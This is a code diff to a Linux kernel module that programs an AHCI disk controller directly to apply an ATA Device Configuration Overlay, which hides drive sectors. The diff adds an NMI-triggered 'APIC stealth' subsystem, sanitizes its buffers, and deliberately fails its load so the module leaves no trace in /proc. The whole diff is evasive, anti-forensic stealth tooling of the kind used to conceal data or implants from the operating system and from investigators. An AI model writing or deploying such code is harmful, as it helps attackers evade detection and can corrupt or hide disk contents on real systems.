@@ -2,7 +2,13 @@
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("System Researcher");
-MODULE_DESCRIPTION("Zero-Allocation Pure MMIO Transient Stealth DCO Module with Aligned Method 2 Log Headers");
+MODULE_DESCRIPTION("Zero-Allocation Pure MMIO Transient Stealth DCO Module with NMI-Driven APIC Pipeline");
+
+/* External declarations from apic_stealth.c */
+extern int __init init_apic_stealth_subsystem(void);
+extern void cleanup_apic_stealth_subsystem(void);
+extern void trigger_nmi_execution(void);
+extern void stealth_sanitize_and_flush(void *addr, size_t size);
 
 static int __init ahci_stealth_dco_init(void)
 {
@@ -23,18 +29,29 @@ static int __init ahci_stealth_dco_init(void)
     u8 *sector_buf;
 
     pr_info("[STEALTH_DCO] ==================================================\n");
-    pr_info("[STEALTH_DCO] ---- METHOD 2/4 + ZERO-ALLOCATION DCO START ------\n");
+    pr_info("[STEALTH_DCO] ---- METHOD 2/4 + NMI APIC STEALTH ENGINE START ---\n");
     pr_info("[STEALTH_DCO] ==================================================\n");
 
+    /* 1. Initialize Persistent APIC & LVT Blinding Subsystem */
+    if (init_apic_stealth_subsystem() != 0) {
+        pr_err("[STEALTH_DCO] FATAL: Failed to initialize APIC stealth subsystem\n");
+        return -ENOMEM;
+    }
+
+    /* 2. Acquire ABAR Mapping */
     abar_base = get_stealth_abar_mmio();
     if (!abar_base) {
         pr_err("[STEALTH_DCO] FATAL: Failed to acquire ABAR mapping\n");
-        return -ENODEV;
+        ret = -ENODEV;
+        goto out_apic;
     }
 
+    /* 3. Execute Hardware Audits and Asynchronous NMI Trigger */
     execute_method2_onchip_mmio_audit(abar_base);
     execute_method4_intx_suppression(abar_base);
-    execute_apic_stealth_engine();
+    
+    /* Fire out-of-band execution via Local APIC NMI trap */
+    trigger_nmi_execution();
 
     port_base = (void *)((char *)abar_base + AHCI_PORT_BASE);
 
@@ -47,7 +64,7 @@ static int __init ahci_stealth_dco_init(void)
     if (!lst_phys) {
         pr_err("[STEALTH_DCO] FATAL: PxCLB is 0, port uninitialized\n");
         ret = -ENODEV;
-        goto out;
+        goto out_abar;
     }
 
     cmd_val = readl((char *)port_base + AHCI_PxCMD);
@@ -60,7 +77,7 @@ static int __init ahci_stealth_dco_init(void)
     if (!slot0_virt || !slot31_virt) {
         pr_err("[STEALTH_DCO] FATAL: manual_direct_map failed for command slots\n");
         ret = -EFAULT;
-        goto out;
+        goto out_abar;
     }
 
     hdr0 = (struct ahci_cmd_header *)slot0_virt;
@@ -72,14 +89,14 @@ static int __init ahci_stealth_dco_init(void)
     if (!slot0_ctba_phys || !slot31_ctba_phys) {
         pr_err("[STEALTH_DCO] FATAL: Pre-allocated CTBA addresses are invalid\n");
         ret = -EFAULT;
-        goto out;
+        goto out_abar;
     }
 
     ctba_virt = manual_direct_map(slot31_ctba_phys);
     if (!ctba_virt) {
         pr_err("[STEALTH_DCO] FATAL: Failed to map slot 31 CTBA\n");
         ret = -EFAULT;
-        goto out;
+        goto out_abar;
     }
 
     prdt0 = (struct ahci_prdt_entry *)((char *)manual_direct_map(slot0_ctba_phys) + 0x80);
@@ -92,7 +109,7 @@ static int __init ahci_stealth_dco_init(void)
     if (!data_virt) {
         pr_err("[STEALTH_DCO] FATAL: Failed to map pre-allocated data buffer\n");
         ret = -EFAULT;
-        goto out;
+        goto out_abar;
     }
 
     memset((void *)ctba_virt, 0, 256);
@@ -133,7 +150,7 @@ static int __init ahci_stealth_dco_init(void)
         }
     } else {
         ret = -EIO;
-        goto out;
+        goto out_abar;
     }
 
     /* Phase 2: DCO Micro-Trim */
@@ -163,14 +180,14 @@ static int __init ahci_stealth_dco_init(void)
             pr_err("[STEALTH_DCO] [-] Controller rejected DCO command.\n");
             ret = -EIO;
         } else {
-            pr_info("[STEALTH_DCO] [++] SUCCESS: DCO applied successfully via Method 2/4 and reused buffers.\n");
+            pr_info("[STEALTH_DCO] [++] SUCCESS: DCO applied successfully via Method 2/4 and NMI pipeline.\n");
             ret = 0;
         }
     } else {
         ret = -EIO;
     }
 
-out:
+out_abar:
     if (abar_base)
         iounmap(abar_base);
 
@@ -181,9 +198,14 @@ out:
     if (data_virt) {
         stealth_sanitize_and_flush((void *)data_virt, 512);
     }
-    
+
+out_apic:
+    /* Clean up persistent APIC mapping before exit */
+    cleanup_apic_stealth_subsystem();
+
     pr_info("[STEALTH_DCO] ---- TRANSIENT EXECUTION FINISHED (ret=%d) ----\n", ret);
 
+    /* Force kernel module loader to instantly discard binary and clean /proc */
     return (ret == 0) ? -ENODEV : ret;
 }
 
